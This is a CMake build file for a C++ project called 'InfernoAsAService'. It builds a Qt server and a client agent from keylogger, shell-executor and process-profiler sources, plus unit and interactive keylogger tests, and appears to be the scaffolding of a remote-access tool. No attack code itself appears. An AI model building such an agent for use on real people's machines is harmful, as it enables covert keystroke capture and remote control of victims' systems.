cmake_minimum_required(VERSION 3.15)
project(InfernoAsAService VERSION 1.0.0 LANGUAGES CXX)

# ==========================================
# 1. Global Compiler Configurations
# ==========================================
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)
add_compile_options(-Wall -Wextra -Wpedantic -Werror)

# ==========================================
# 2. Qt Dependencies (Circle 4)
# ==========================================
set(CMAKE_AUTOMOC ON)
set(CMAKE_AUTORCC ON)
set(CMAKE_AUTOUIC ON)

find_package(Qt6 REQUIRED COMPONENTS Core Widgets Gui)

# ==========================================
# 2. Common Library (Networking & Protocol)
# ==========================================
add_library(inferno_common STATIC
    common/src/Socket.cpp
    common/src/Packet.cpp
)
target_include_directories(inferno_common PUBLIC common/include)

# ==========================================
# 3. Server Executable
# ==========================================
add_executable(inferno_server
    server/src/main.cpp
    server/src/server.cpp
    server/include/server.hpp
)
target_link_libraries(inferno_server PRIVATE inferno_common Qt6::Widgets Qt6::Gui Qt6::Core)

# ==========================================
# 4. Client Agent Executable 
# ==========================================
add_executable(inferno_client
    client/src/main.cpp
    client/src/Agent.cpp
    client/src/ProcessProfiler.cpp
    client/src/ShellExecutor.cpp
    client/src/KeyLogger.cpp
)
target_link_libraries(inferno_client PRIVATE inferno_common)

if(APPLE)
    find_library(CORE_GRAPHICS CoreGraphics)
    find_library(CARBON Carbon)
    target_link_libraries(inferno_client PRIVATE ${CORE_GRAPHICS} ${CARBON})
endif()

# ==========================================
# 5. TDD Infrastructure
# ==========================================
enable_testing()
add_executable(inferno_tests
    tests/main_test.cpp
    tests/socket_test.cpp
    tests/server_test.cpp
    tests/packet_test.cpp
    tests/shell_test.cpp
    tests/keylogger_test.cpp
    server/src/server.cpp
    server/include/server.hpp
    client/src/ProcessProfiler.cpp
    client/src/ShellExecutor.cpp
    client/src/KeyLogger.cpp
)
target_link_libraries(inferno_tests PRIVATE inferno_common Qt6::Widgets Qt6::Gui Qt6::Core)
target_compile_definitions(inferno_tests PRIVATE INFERNO_TESTING)

if(APPLE)
    target_link_libraries(inferno_tests PRIVATE ${CORE_GRAPHICS} ${CARBON})
endif()

add_test(NAME CoreNetworkingTests COMMAND inferno_tests)

# ==========================================
# 6. Interactive / Manual Tests
# ==========================================
add_executable(inferno_keylogger_interactive
    tests/keylogger_interactive_test.cpp
    client/src/KeyLogger.cpp
)
if(APPLE)
    target_link_libraries(inferno_keylogger_interactive PRIVATE ${CORE_GRAPHICS} ${CARBON})
endif()
